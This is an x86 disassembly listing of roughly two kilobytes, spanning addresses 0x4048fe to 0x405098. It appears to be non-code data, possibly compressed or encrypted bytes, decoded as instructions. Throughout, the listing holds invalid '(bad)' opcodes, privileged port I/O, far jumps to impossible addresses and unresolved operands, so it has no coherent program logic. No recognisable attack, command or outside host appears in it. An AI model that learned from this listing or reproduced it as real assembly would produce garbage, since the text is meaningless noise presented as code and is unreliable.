  4048fe:	imul   eax,DWORD PTR [edi+0x6e77b98e],0xffffffd4
  404905:	and    DWORD PTR [ebp+0x1d],0x4da043de
  40490c:	(bad)
  404910:	mov    eax,ds:0x29b853e0
  404915:	scas   eax,DWORD PTR es:[edi]
  404916:	stc    
  404917:	or     BYTE PTR [ebp-0x1dbe7c49],dl
  40491d:	loope  0x40495e
  40491f:	sub    edx,DWORD PTR [ebx-0x5bd19a7f]
  404925:	inc    edi
  404926:	rol    BYTE PTR [ecx],cl
  404928:	inc    esi
  404929:	dec    eax
  40492a:	in     al,dx
  40492b:	mov    edi,esi
  40492d:	jb     0x4049a3
  40492f:	cmp    bh,bh
  404931:	repz dec eax
  404933:	sub    dl,BYTE PTR [esi+ecx*4+0x35]
  404937:	aas    
  404938:	sub    BYTE PTR [esi],ch
  40493a:	xchg   esi,eax
  40493b:	repz mov ah,0xf8
  40493e:	add    al,0x53
  404940:	mov    ah,0x3e
  404942:	js     0x4048d1
  404944:	push   ebp
  404945:	mov    al,ds:0xc0c17271
  40494a:	jg     0x40493c
  40494c:	or     eax,0xebaebd2
  404951:	out    0x28,al
  404953:	mov    BYTE PTR [ebx+0x30],bl
  404956:	imul   eax,DWORD PTR [ebp+edx*8+0x56],0x214cf4c5
  40495e:	leave  
  40495f:	xchg   edi,eax
  404960:	stc    
  404961:	pop    ss
  404962:	das    
  404963:	cmp    eax,0xaa6d6614
  404968:	jecxz  0x404957
  40496a:	lea    eax,[ebx]
  40496c:	mov    bl,0x5d
  40496e:	ds ds (bad) 
  404971:	and    esp,DWORD PTR [ebp+0xf]
  404974:	sbb    ebx,edi
  404976:	pop    ebx
  404977:	push   ebx
  404978:	mov    edx,esi
  40497a:	in     al,dx
  40497b:	push   ecx
  40497c:	pop    esi
  40497d:	stos   DWORD PTR es:[edi],eax
  40497e:	push   cs
  40497f:	jecxz  0x4049dd
  404981:	mov    DWORD PTR [edi+0xe],ebp
  404984:	mov    BYTE PTR [ebx-0x3415a483],cl
  40498a:	push   eax
  40498b:	and    dl,bl
  40498d:	imul   ebp,esp,0xdbbe81c1
  404993:	dec    esp
  404994:	xchg   edi,eax
  404995:	adc    eax,0xf3f7e7ac
  40499a:	cmp    dh,BYTE PTR [ebx-0x70]
  40499d:	jnp    0x4049ef
  40499f:	out    0x48,eax
  4049a1:	daa    
  4049a2:	mov    al,0x52
  4049a4:	popf   
  4049a5:	outs   dx,DWORD PTR ds:[esi]
  4049a6:	dec    ebp
  4049a7:	jmp    0xad9d:0x293788d9
  4049ae:	aam    0x59
  4049b0:	int3   
  4049b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b2:	push   esi
  4049b3:	mov    al,ds:0x64b3c834
  4049b8:	jle    0x404949
  4049ba:	and    BYTE PTR [edx+0x6aff71ec],al
  4049c0:	adc    DWORD PTR ds:0x96db7d0f,ebp
  4049c6:	jb     0x404a35
  4049c8:	daa    
  4049c9:	out    dx,al
  4049ca:	ret    0xdded
  4049cd:	(bad)  
  4049ce:	pop    edi
  4049cf:	inc    edi
  4049d0:	icebp  
  4049d1:	shr    BYTE PTR [esp+ebx*1],0xba
  4049d5:	cmp    DWORD PTR [eax],edx
  4049d7:	adc    DWORD PTR [ebx+0x7d],ecx
  4049da:	xchg   ecx,eax
  4049db:	das    
  4049dc:	mov    ecx,ebx
  4049de:	cmp    eax,0xc5021653
  4049e3:	sub    dh,BYTE PTR [esi+edi*8]
  4049e6:	jnp    0x404a5d
  4049e8:	ins    DWORD PTR es:[edi],dx
  4049e9:	push   ecx
  4049ea:	xlat   BYTE PTR ds:[ebx]
  4049eb:	(bad)  
  4049ec:	and    bh,BYTE PTR [esi-0x497575bd]
  4049f2:	je     0x4049f3
  4049f4:	add    DWORD PTR [edi-0x62d3c4ec],ecx
  4049fa:	inc    esi
  4049fb:	sub    ebp,DWORD PTR [ebx+0x7947d62b]
  404a01:	fstp   TBYTE PTR [esi-0xc6b9fe6]
  404a07:	sbb    al,0x42
  404a09:	xchg   ebp,eax
  404a0a:	cmp    DWORD PTR [esi+eax*4-0x5],edx
  404a0e:	pop    esp
  404a0f:	nop
  404a10:	stos   DWORD PTR es:[edi],eax
  404a11:	push   ecx
  404a12:	jecxz  0x4049b9
  404a14:	les    esi,FWORD PTR [edx]
  404a16:	mov    al,0xb3
  404a18:	not    BYTE PTR [eax+0x6]
  404a1b:	out    0x93,al
  404a1d:	icebp  
  404a1e:	or     ch,cl
  404a20:	das    
  404a21:	push   ebx
  404a22:	jmp    0xa730a83d
  404a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a28:	jne    0x404a0f
  404a2a:	mov    ebx,0x6464e266
  404a2f:	xor    BYTE PTR [eax-0x2c60e687],dl
  404a35:	sbb    DWORD PTR [ebp+0x4378a189],edi
  404a3b:	mov    ebx,cs
  404a3d:	addr16 push ss
  404a3f:	int3   
  404a40:	jb     0x404a80
  404a42:	xchg   edx,eax
  404a43:	sbb    al,BYTE PTR [ebx-0x4e]
  404a46:	xchg   BYTE PTR [edi],dl
  404a48:	fwait
  404a49:	adc    bh,ah
  404a4b:	mov    ah,0x78
  404a4d:	xchg   ebp,eax
  404a4e:	js     0x404a15
  404a50:	xor    al,0x6d
  404a52:	xchg   edi,eax
  404a53:	xor    edi,DWORD PTR [eax]
  404a55:	inc    edx
  404a56:	and    eax,0x29b303df
  404a5b:	test   BYTE PTR [edi+edi*4-0x18],dl
  404a5f:	adc    cl,dl
  404a61:	ret    0x53c7
  404a64:	test   al,0xd8
  404a66:	sti    
  404a67:	sub    al,BYTE PTR ds:0xb566d5f4
  404a6d:	int    0x6d
  404a6f:	test   esp,esp
  404a71:	mul    BYTE PTR [ebx-0x322b7c2a]
  404a77:	(bad)  
  404a78:	call   0xd6695b5f
  404a7d:	stos   BYTE PTR es:[edi],al
  404a7e:	push   edi
  404a7f:	add    DWORD PTR [edi+edx*8],ebp
  404a82:	pop    esi
  404a83:	not    DWORD PTR ds:0x9199a0ac
  404a89:	ja     0x404aff
  404a8b:	iret   
  404a8c:	outs   dx,DWORD PTR ds:[esi]
  404a8d:	rcr    ebp,cl
  404a8f:	jne    0x404a2b
  404a91:	rep lods eax,DWORD PTR ds:[esi]
  404a93:	loopne 0x404aff
  404a95:	jg     0x404ac4
  404a97:	(bad)  
  404a98:	mov    ebx,0xbbd6b36c
  404a9d:	adc    ecx,DWORD PTR [edi+0x2e]
  404aa0:	mov    dh,0x68
  404aa2:	inc    esi
  404aa3:	mov    eax,ds:0x84aefb96
  404aa8:	cmp    ebp,DWORD PTR [esi+0x6a]
  404aab:	push   0x893d844
  404ab0:	jno    0x404a8b
  404ab2:	fmul   st,st(0)
  404ab4:	into   
  404ab5:	not    DWORD PTR [ebp-0x2e]
  404ab8:	dec    eax
  404ab9:	std    
  404aba:	daa    
  404abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404abc:	jmp    0xa800302a
  404ac1:	test   DWORD PTR [eax-0x13],ecx
  404ac4:	sbb    eax,0xdba925ac
  404ac9:	push   edi
  404aca:	sub    al,0x32
  404acc:	fucomip st,st(1)
  404ace:	add    al,BYTE PTR [eax-0x5e47a013]
  404ad4:	retf   0xad51
  404ad7:	nop
  404ad8:	es aaa 
  404ada:	cmp    al,0x91
  404adc:	mov    al,ds:0x95f1fc23
  404ae1:	in     al,dx
  404ae2:	das    
  404ae3:	pushf  
  404ae4:	stc    
  404ae5:	mov    bh,0xa1
  404ae7:	dec    edx
  404ae8:	lock mov bl,0x4a
  404aeb:	aaa    
  404aec:	out    0x23,eax
  404aee:	cmp    al,0x57
  404af0:	hlt    
  404af1:	mov    BYTE PTR [eax],dh
  404af3:	dec    edx
  404af4:	jne    0x404ad6
  404af6:	xchg   ecx,eax
  404af7:	imul   ebp,DWORD PTR [eax-0x77],0x78
  404afb:	imul   eax,DWORD PTR [ecx-0x10],0xa66dc774
  404b02:	inc    BYTE PTR [ecx]
  404b04:	jg     0x404afb
  404b06:	je     0x404b24
  404b08:	xchg   ebx,eax
  404b09:	jo     0x404ae8
  404b0b:	rcl    DWORD PTR [ebx*2-0x55b4ca41],0xac
  404b13:	push   es
  404b14:	(bad)  [ecx]
  404b16:	adc    ah,BYTE PTR [eax-0x30]
  404b19:	or     eax,0xf4f5322a
  404b1e:	mov    ebx,0xab0de5da
  404b23:	lods   eax,DWORD PTR ds:[esi]
  404b24:	xchg   edx,eax
  404b25:	adc    BYTE PTR [ebp-0x1b327a84],0x49
  404b2c:	dec    ebp
  404b2d:	or     BYTE PTR [esi+0x3a83d40d],ah
  404b33:	rcl    BYTE PTR [esp+ebx*4-0x50],1
  404b37:	nop
  404b38:	push   ecx
  404b39:	inc    esp
  404b3a:	lahf   
  404b3b:	mov    WORD PTR ds:0x58c07b6d,?
  404b41:	dec    esi
  404b42:	push   0xfffffffb
  404b44:	sbb    dh,ch
  404b46:	nop
  404b47:	outs   dx,DWORD PTR ds:[esi]
  404b48:	cwde   
  404b49:	jno    0x404b0d
  404b4b:	push   ecx
  404b4c:	mov    ebx,0x64abf765
  404b51:	dec    edx
  404b52:	int3   
  404b53:	push   edi
  404b54:	or     al,0xb7
  404b56:	je     0x404af6
  404b58:	stos   DWORD PTR es:[edi],eax
  404b59:	sbb    edi,DWORD PTR [ebx-0x58]
  404b5c:	cmp    al,BYTE PTR ss:[ebx-0x4f]
  404b60:	jb     0x404b9b
  404b62:	xchg   edi,eax
  404b63:	push   ds
  404b64:	pop    es
  404b65:	mov    cs,esi
  404b67:	sub    eax,0x7ec1ded1
  404b6c:	push   0xffffffc6
  404b6e:	cli    
  404b6f:	dec    edx
  404b70:	cld    
  404b71:	not    DWORD PTR [edx+ebx*8]
  404b74:	sub    al,dl
  404b76:	inc    ebp
  404b77:	mov    ah,0x9c
  404b79:	adc    eax,0x960147df
  404b7e:	sub    eax,0xfbfdad23
  404b83:	jo     0x404b75
  404b85:	or     eax,0xbac95430
  404b8a:	xchg   DWORD PTR [edx+0x41],ebp
  404b8d:	(bad)  
  404b8e:	and    eax,edx
  404b90:	retf   
  404b91:	mov    BYTE PTR [esi],cl
  404b93:	and    eax,0xe6c5df36
  404b98:	or     eax,0x7b918970
  404b9d:	test   al,0x14
  404b9f:	push   0x7c
  404ba1:	dec    esp
  404ba2:	xchg   DWORD PTR [esi],edi
  404ba4:	mov    ss,ebx
  404ba6:	inc    esi
  404ba7:	jg     0x404bd0
  404ba9:	iret   
  404baa:	sub    BYTE PTR [ebp+0x4f5b5bd8],ah
  404bb0:	and    eax,0xc3058e70
  404bb5:	push   0x113d9a0b
  404bba:	xchg   edx,eax
  404bbb:	ss sbb eax,0x58119175
  404bc1:	sub    edx,DWORD PTR [ecx+0x58]
  404bc4:	ins    DWORD PTR es:[edi],dx
  404bc5:	cmp    esp,DWORD PTR [edi+0x69]
  404bc8:	or     al,0xfc
  404bca:	inc    edx
  404bcb:	loop   0x404c3e
  404bcd:	loope  0x404ba2
  404bcf:	dec    ebp
  404bd0:	pop    esp
  404bd1:	adc    edx,DWORD PTR [esi+0x6049c7f7]
  404bd7:	sbb    DWORD PTR [ecx+0x5f],edi
  404bda:	sar    DWORD PTR [edi],cl
  404bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bdd:	mov    bl,0x7f
  404bdf:	jl     0x404c45
  404be1:	int    0x78
  404be3:	fidiv  WORD PTR [ebp-0x4289243b]
  404be9:	pop    edx
  404bea:	outs   dx,DWORD PTR ds:[esi]
  404beb:	shr    BYTE PTR [esi-0xc791f1b],cl
  404bf1:	jg     0x404c24
  404bf3:	adc    BYTE PTR [ebx+0x214d7826],dl
  404bf9:	jne    0x404b88
  404bfb:	dec    eax
  404bfc:	sti    
  404bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bfe:	jl     0x404b93
  404c00:	(bad)  
  404c01:	mov    bh,0x9c
  404c03:	mov    ebp,0x62758de9
  404c08:	fsub   QWORD PTR [ebx]
  404c0a:	mov    bh,0xc8
  404c0c:	cmp    DWORD PTR [ebx],0xffffff91
  404c0f:	push   esi
  404c10:	sbb    edi,DWORD PTR [ebp-0x75195e79]
  404c16:	ins    DWORD PTR es:[edi],dx
  404c17:	in     al,0xd1
  404c19:	fadd   QWORD PTR [esi-0x28]
  404c1c:	lahf   
  404c1d:	push   esi
  404c1e:	jno    0x404c38
  404c20:	xor    eax,0x15b06325
  404c25:	jne    0x404bf6
  404c27:	adc    eax,0x883b5a92
  404c2c:	retf   0x4d7d
  404c2f:	outs   dx,DWORD PTR ds:[esi]
  404c30:	mov    eax,0x359e221b
  404c35:	in     al,0x54
  404c37:	ss (bad) 
  404c3a:	xor    BYTE PTR [ebp+0x4e],ch
  404c3d:	inc    eax
  404c3e:	xor    ah,BYTE PTR ss:[esp+ebx*8+0x7ffa200f]
  404c46:	xor    eax,0x6e098297
  404c4b:	out    dx,al
  404c4c:	dec    esi
  404c4d:	mov    al,ds:0xaf3c5a20
  404c52:	repz or ch,BYTE PTR [ecx+0x60]
  404c56:	cmp    eax,0xab209b4f
  404c5b:	leave  
  404c5c:	jnp    0x404bf6
  404c5e:	sbb    al,0xc7
  404c60:	xchg   ebp,eax
  404c61:	adc    esi,DWORD PTR [ebp-0x49]
  404c64:	adc    bl,al
  404c66:	push   0xffffffc0
  404c68:	mov    ch,0x68
  404c6a:	addr16 inc edi
  404c6c:	enter  0xef06,0xf
  404c70:	adc    eax,0x30d989d8
  404c75:	dec    edi
  404c76:	mov    ah,0x84
  404c78:	sar    ecx,1
  404c7a:	jle    0x404ccd
  404c7c:	fsubr  DWORD PTR [eax+esi*2+0x4a]
  404c80:	jno    0x404ca1
  404c82:	fadd   DWORD PTR [ebp-0x5dfffb6f]
  404c88:	add    BYTE PTR [ebp+0x8],0xca
  404c8c:	hlt    
  404c8d:	jle    0x404c79
  404c8f:	mov    al,0xbc
  404c91:	scas   al,BYTE PTR es:[edi]
  404c92:	mov    BYTE PTR [ebp-0x49],bh
  404c95:	test   DWORD PTR [edi-0x12019759],eax
  404c9b:	mov    esp,0x596d6086
  404ca0:	test   eax,0x7cd9f3bd
  404ca5:	mov    ch,0xfd
  404ca7:	mov    esp,0xcff4c394
  404cac:	dec    esi
  404cad:	push   ds
  404cae:	or     ch,bl
  404cb0:	pushf  
  404cb1:	xlat   BYTE PTR ds:[ebx]
  404cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cb3:	sahf   
  404cb4:	or     al,0x15
  404cb6:	xor    al,0xb
  404cb8:	mov    edi,0x1f3171d3
  404cbd:	mov    edi,0x6a98ab01
  404cc2:	mov    fs,WORD PTR [ebp+0x69b68c2b]
  404cc8:	dec    edi
  404cc9:	jg     0x404c5e
  404ccb:	out    0xee,eax
  404ccd:	push   ds
  404cce:	int    0xfc
  404cd0:	xchg   edi,eax
  404cd1:	adc    eax,0xa336c4cc
  404cd6:	fisttp WORD PTR [ebx+0x1]
  404cd9:	mov    DWORD PTR [edi-0x67],ecx
  404cdc:	push   ebx
  404cdd:	cmp    eax,0xdf2a9401
  404ce2:	xchg   edi,eax
  404ce3:	sbb    BYTE PTR [edx],dh
  404ce5:	pusha  
  404ce6:	sbb    DWORD PTR [edi+ebx*4-0x630f7f74],esp
  404ced:	out    0x3,al
  404cef:	push   ecx
  404cf0:	out    0xe1,al
  404cf2:	arpl   WORD PTR [eax-0x701b2933],ax
  404cf8:	in     eax,0x31
  404cfa:	ret    
  404cfb:	ins    DWORD PTR es:[edi],dx
  404cfc:	jmp    0x404cb0
  404cfe:	fidiv  DWORD PTR [bp-0x49]
  404d03:	inc    ebx
  404d04:	dec    esp
  404d05:	dec    eax
  404d06:	popa   
  404d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d08:	pop    esi
  404d09:	repz pop ss
  404d0b:	(bad)  
  404d0f:	xor    dl,dh
  404d11:	jg     0x404d91
  404d13:	inc    BYTE PTR [ecx]
  404d15:	add    al,0xb5
  404d17:	std    
  404d18:	mov    cl,BYTE PTR [eax]
  404d1a:	out    dx,al
  404d1b:	dec    edi
  404d1c:	or     BYTE PTR [edi-0x3f0ef42d],bl
  404d22:	pop    esi
  404d23:	dec    ebp
  404d24:	test   eax,0x48a6d512
  404d29:	lahf   
  404d2a:	inc    edx
  404d2b:	pop    ebp
  404d2c:	(bad)  
  404d2d:	cld    
  404d2e:	or     eax,0xdb92d517
  404d33:	imul   BYTE PTR [edx-0x74]
  404d36:	sbb    al,0x65
  404d38:	or     ch,BYTE PTR [ecx+ebx*2]
  404d3b:	outs   dx,DWORD PTR ds:[esi]
  404d3c:	je     0x404db7
  404d3e:	sbb    BYTE PTR [ebx+0x1b],bh
  404d41:	inc    eax
  404d42:	adc    DWORD PTR [ecx-0x387664e9],edi
  404d48:	aam    0x6
  404d4a:	jge    0x404db6
  404d4c:	arpl   WORD PTR [ebx-0x3c7332f0],bx
  404d52:	js     0x404d5d
  404d54:	push   0x4a5c5fe9
  404d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d5a:	iret   
  404d5b:	hlt    
  404d5c:	jne    0x404d26
  404d5e:	clc    
  404d5f:	leave  
  404d60:	aam    0xa4
  404d62:	std    
  404d63:	out    0x3d,al
  404d65:	push   es
  404d66:	jg     0x404d34
  404d68:	stos   BYTE PTR es:[edi],al
  404d69:	mov    eax,DWORD PTR [ebx]
  404d6b:	jne    0x404cfe
  404d6d:	inc    ebp
  404d6e:	jns    0x404d14
  404d70:	pop    esi
  404d71:	(bad)  
  404d72:	push   ss
  404d73:	rcr    al,1
  404d75:	sbb    dl,BYTE PTR [ebx]
  404d77:	xchg   ebp,eax
  404d78:	data16 sub al,0x48
  404d7b:	mov    cs,edi
  404d7d:	pop    ecx
  404d7e:	xchg   esp,eax
  404d7f:	or     eax,0x4858526
  404d84:	mov    dl,0xed
  404d86:	stos   BYTE PTR es:[edi],al
  404d87:	out    0x47,eax
  404d89:	dec    ebp
  404d8a:	imul   edx,DWORD PTR [ecx-0x7fce8c8c],0xffffff80
  404d91:	in     al,dx
  404d92:	xor    al,0x6a
  404d94:	hlt    
  404d95:	cdq    
  404d96:	test   ecx,0xdc9a3206
  404d9c:	cmp    al,0x94
  404d9e:	xor    al,0x8
  404da0:	push   0x744f47c4
  404da5:	jno    0x404df3
  404da7:	fwait
  404da8:	test   BYTE PTR [edx+0x59],ch
  404dab:	push   es
  404dac:	mov    al,0x78
  404dae:	xchg   edx,eax
  404daf:	xor    cl,dh
  404db1:	neg    BYTE PTR [edx]
  404db3:	sub    dh,BYTE PTR [edx-0x63cc397c]
  404db9:	aaa    
  404dba:	adc    eax,0xb7865122
  404dbf:	xchg   esi,eax
  404dc0:	cmp    al,BYTE PTR [ecx+0x7361e2f1]
  404dc6:	mov    ah,0x28
  404dc8:	jl     0x404dad
  404dca:	ss jo  0x404de1
  404dcd:	jg     0x404e3b
  404dcf:	xor    ebp,DWORD PTR [ecx]
  404dd1:	mov    bl,0xa0
  404dd3:	aad    0xba
  404dd5:	adc    BYTE PTR [edi-0x3c26b70],0xa
  404ddc:	test   al,cl
  404dde:	test   al,0x85
  404de0:	pop    eax
  404de1:	add    dh,dh
  404de3:	loop   0x404e3a
  404de5:	push   es
  404de6:	loope  0x404e43
  404de8:	push   0xe8003d1b
  404ded:	jns    0x404e0e
  404def:	cli    
  404df0:	dec    ebx
  404df1:	push   edx
  404df2:	jecxz  0x404e6b
  404df4:	jmp    0x404db7
  404df6:	fxch   st(6)
  404df8:	icebp  
  404df9:	in     al,dx
  404dfa:	scas   al,BYTE PTR es:[edi]
  404dfb:	fst    QWORD PTR [edx+0x4f06f315]
  404e01:	push   esi
  404e02:	call   0x44b0d881
  404e07:	das    
  404e08:	repnz cld 
  404e0a:	call   DWORD PTR ds:0x13e8d6d5
  404e10:	(bad)  
  404e12:	fwait
  404e13:	inc    eax
  404e14:	push   ecx
  404e15:	cmp    al,0xf3
  404e17:	mov    al,0x6
  404e19:	and    dh,ch
  404e1b:	ret    
  404e1c:	test   DWORD PTR [ebp-0x207fdfd6],edx
  404e22:	popf   
  404e23:	pop    esp
  404e24:	mov    ds:0x865f548e,al
  404e29:	test   eax,0x6128299c
  404e2e:	loope  0x404e17
  404e30:	bound  edx,QWORD PTR [edx]
  404e32:	shr    dl,1
  404e34:	mov    dl,0xdb
  404e36:	cmc    
  404e37:	loope  0x404ea0
  404e39:	jp     0x404dbc
  404e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e3c:	xor    dh,BYTE PTR [ecx+0x511a9520]
  404e42:	cli    
  404e43:	sbb    BYTE PTR [eax+0x55cef811],al
  404e49:	outs   dx,BYTE PTR ds:[esi]
  404e4a:	call   0xda8b26aa
  404e4f:	adc    cl,BYTE PTR [ecx+0x2912976f]
  404e55:	fiadd  DWORD PTR [esi]
  404e57:	push   ebx
  404e58:	popa   
  404e59:	add    edi,DWORD PTR [edx-0x1270b13d]
  404e5f:	sub    BYTE PTR [ebp+0x7f42da94],0x9e
  404e66:	leave  
  404e67:	ret    0x6077
  404e6a:	iret   
  404e6b:	jle    0x404e01
  404e6d:	call   0xbfb0:0x57cb56e3
  404e74:	mov    ds:0xf48feab9,al
  404e79:	call   0xf4cfafbb
  404e7e:	xor    ebp,edi
  404e80:	aam    0x21
  404e82:	outs   dx,BYTE PTR ds:[esi]
  404e83:	sbb    DWORD PTR [ebx+esi*8-0x28acde30],edx
  404e8a:	add    eax,0x2afed603
  404e8f:	sub    al,0x9
  404e91:	jae    0x404e36
  404e93:	pop    eax
  404e94:	dec    edi
  404e95:	test   BYTE PTR ds:0xc4d42aff,bh
  404e9b:	pop    esp
  404e9c:	xchg   ebx,eax
  404e9d:	inc    edi
  404e9e:	xchg   edi,eax
  404e9f:	xchg   edi,eax
  404ea0:	inc    edx
  404ea1:	sbb    BYTE PTR ds:0xff39bb66,al
  404ea7:	sar    DWORD PTR [esi-0x32],cl
  404eaa:	add    DWORD PTR ds:0xe8140b4c,edx
  404eb0:	into   
  404eb1:	out    0xeb,eax
  404eb3:	jl     0x404ec6
  404eb5:	dec    eax
  404eb6:	(bad)  
  404eb7:	and    dl,dh
  404eb9:	scas   eax,DWORD PTR es:[edi]
  404eba:	in     al,0xd4
  404ebc:	sti    
  404ebd:	pusha  
  404ebe:	shl    BYTE PTR [eax+0x72],1
  404ec1:	push   ebp
  404ec2:	jne    0x404e7b
  404ec4:	mov    dl,0x1e
  404ec6:	jno    0x404efc
  404ec8:	lods   al,BYTE PTR ds:[esi]
  404ec9:	cmp    edi,DWORD PTR [edx+0x2d]
  404ecc:	addr16 mov ss,esp
  404ecf:	stos   BYTE PTR es:[edi],al
  404ed0:	and    eax,0xaa087438
  404ed5:	scas   al,BYTE PTR es:[edi]
  404ed6:	push   es
  404ed7:	adc    esi,0x45
  404eda:	(bad)  
  404edc:	xlat   BYTE PTR ds:[ebx]
  404edd:	lock mov al,ds:0xebc3589b
  404ee3:	cld    
  404ee4:	enter  0x3299,0x8c
  404ee8:	push   ss
  404ee9:	and    eax,0x979ffdcb
  404eee:	ror    cl,1
  404ef0:	fwait
  404ef1:	push   ebp
  404ef2:	lahf   
  404ef3:	das    
  404ef4:	ins    DWORD PTR es:[edi],dx
  404ef5:	push   esp
  404ef6:	xor    DWORD PTR ds:0x6cb5e8d1,edi
  404efc:	sbb    al,0x66
  404efe:	dec    edx
  404eff:	iret   
  404f00:	xchg   DWORD PTR [edi+0x57e68dee],eax
  404f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f07:	inc    ebp
  404f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f09:	add    bl,BYTE PTR [edx]
  404f0b:	push   eax
  404f0c:	nop
  404f0d:	xor    al,0x44
  404f0f:	ret    0xce2d
  404f12:	jecxz  0x404f13
  404f14:	shl    BYTE PTR [eax],1
  404f16:	jae    0x404f36
  404f18:	(bad)  
  404f19:	fisub  WORD PTR ds:0xce7abd01
  404f1f:	xchg   edi,eax
  404f20:	mov    gs,WORD PTR [edi+0x4a307008]
  404f26:	inc    ecx
  404f27:	(bad)  
  404f28:	out    dx,al
  404f29:	(bad)  
  404f2a:	cld    
  404f2b:	inc    ebp
  404f2c:	pushf  
  404f2d:	mov    ebp,0xefad1ec3
  404f32:	jp     0x404f6d
  404f34:	sahf   
  404f35:	stos   BYTE PTR es:[edi],al
  404f36:	adc    ecx,DWORD PTR [eax*8-0x3fbee7b]
  404f3d:	or     ecx,DWORD PTR [ebp+0x1c]
  404f40:	fisub  DWORD PTR ds:0xa4e3d647
  404f46:	jae    0x404f5e
  404f48:	test   ebx,esi
  404f4a:	or     ah,BYTE PTR [ebp+0x736b3964]
  404f50:	ss in  al,0x55
  404f53:	dec    ebp
  404f54:	jbe    0x404f32
  404f56:	loope  0x404f8f
  404f58:	jmp    0x404ee2
  404f5a:	mov    ebx,0x7ed3e80
  404f5f:	dec    esp
  404f60:	rol    ecx,cl
  404f62:	jb     0x404fc0
  404f64:	mov    dh,0x1b
  404f66:	cmc    
  404f67:	push   0x7a
  404f69:	retf   0xcdc6
  404f6c:	xor    DWORD PTR [ecx+ebx*1],ecx
  404f6f:	cmp    edx,0xffffff97
  404f72:	xchg   ebp,eax
  404f73:	xchg   edi,eax
  404f74:	jp     0x404f3a
  404f76:	adc    BYTE PTR [ebp-0x34],cl
  404f79:	dec    ebp
  404f7a:	fbstp  TBYTE PTR [ecx]
  404f7c:	out    dx,al
  404f7d:	xchg   ebx,eax
  404f7e:	mov    dh,0x8a
  404f80:	repz add al,BYTE PTR [ebx+0x7a]
  404f84:	dec    edi
  404f85:	daa    
  404f86:	ret    
  404f87:	ror    BYTE PTR [edi+0x53],1
  404f8a:	xchg   ebx,eax
  404f8b:	pushf  
  404f8c:	mov    ebp,0xc09d4ffa
  404f91:	pusha  
  404f92:	out    dx,eax
  404f93:	mov    ebx,0x2f4ac796
  404f98:	dec    ebp
  404f99:	hlt    
  404f9a:	das    
  404f9b:	cmp    ch,BYTE PTR [ebx+0x121652d]
  404fa1:	outs   dx,BYTE PTR ds:[esi]
  404fa2:	scas   al,BYTE PTR es:[edi]
  404fa3:	test   eax,0x29726956
  404fa8:	mov    ebx,0x64ea907d
  404fad:	imul   ebx,DWORD PTR [ebp-0x654d2bbc],0x2a
  404fb4:	mov    esi,?
  404fb6:	or     al,0x23
  404fb8:	push   edx
  404fb9:	add    esi,ecx
  404fbb:	mov    eax,ds:0xebfd00e1
  404fc0:	mov    ecx,0x34f2cc4e
  404fc5:	add    dl,BYTE PTR [edx-0xf]
  404fc8:	cmp    al,0x5f
  404fca:	sub    BYTE PTR [edx-0x15],bh
  404fcd:	add    bh,bl
  404fcf:	jp     0x404f60
  404fd1:	add    BYTE PTR [eax-0x1],0x8d
  404fd5:	adc    eax,0x60bc226
  404fda:	arpl   si,bx
  404fdc:	xchg   ebx,eax
  404fdd:	mov    bl,BYTE PTR [eax]
  404fdf:	lahf   
  404fe0:	(bad)  
  404fe2:	sti    
  404fe3:	adc    eax,0xac6b1703
  404fe8:	push   esi
  404fe9:	cdq    
  404fea:	bound  ecx,QWORD PTR [ebx+ecx*4+0x20a4b267]
  404ff1:	neg    BYTE PTR [ebx]
  404ff3:	xchg   ecx,eax
  404ff4:	retf   
  404ff5:	js     0x405075
  404ff7:	pop    ecx
  404ff8:	mov    esi,esi
  404ffa:	xchg   ebp,eax
  404ffb:	out    dx,al
  404ffc:	mov    BYTE PTR [edx-0x7b],ah
  404fff:	sub    BYTE PTR [edx+edx*4],cl
  405002:	stos   BYTE PTR es:[edi],al
  405003:	or     ecx,edi
  405005:	sub    BYTE PTR [edx],bl
  405007:	xor    al,0x9d
  405009:	or     eax,0x96190464
  40500e:	adc    bh,dh
  405010:	push   edi
  405011:	rol    ebp,1
  405013:	out    0xa5,eax
  405015:	fcomp  st(2)
  405017:	add    eax,0xd88f3204
  40501c:	dec    esp
  40501d:	jmp    0x40507e
  40501f:	pushf  
  405020:	cmp    edi,DWORD PTR [esi+0x23]
  405023:	inc    esi
  405024:	add    al,0x48
  405026:	inc    edx
  405027:	sub    al,0x11
  405029:	push   ds
  40502a:	ins    DWORD PTR es:[edi],dx
  40502b:	mov    esi,ecx
  40502d:	xchg   ebp,eax
  40502e:	xchg   esp,eax
  40502f:	mov    al,0x39
  405031:	enter  0x1e9e,0x56
  405035:	dec    edi
  405036:	cmp    eax,DWORD PTR [esi-0x50f9f7c9]
  40503c:	mov    esp,0x6aac05af
  405041:	xchg   ebx,eax
  405042:	dec    eax
  405043:	xchg   ecx,eax
  405044:	outs   dx,BYTE PTR ds:[esi]
  405045:	and    BYTE PTR [ebp-0x35],bl
  405048:	xchg   esp,eax
  405049:	mov    DWORD PTR [edx+0x531fa7ef],edi
  40504f:	(bad)  
  405050:	fidivr WORD PTR ds:0xcb9e2c20
  405056:	inc    ecx
  405057:	sub    eax,0xaab1fde
  40505c:	or     eax,0xab12c6e1
  405061:	push   eax
  405062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405063:	sub    al,0x84
  405065:	lahf   
  405066:	sar    cl,1
  405068:	fmul   st(7),st
  40506a:	push   0x14
  40506c:	xchg   ebx,eax
  40506d:	mov    ds:0x267f4170,eax
  405072:	jb     0x405012
  405074:	sbb    bh,ch
  405076:	cli    
  405077:	and    eax,0x3e3493f3
  40507c:	and    eax,0xee8381ca
  405081:	or     eax,DWORD PTR [ebx+0x325afb2a]
  405087:	sbb    ebp,DWORD PTR [eax+edi*2+0x24cf29c6]
  40508e:	imul   edx,DWORD PTR [ebp+ebx*4+0x6e],0x4edf9a5b
  405096:	es icebp 
  405098:	xchg   esp,eax
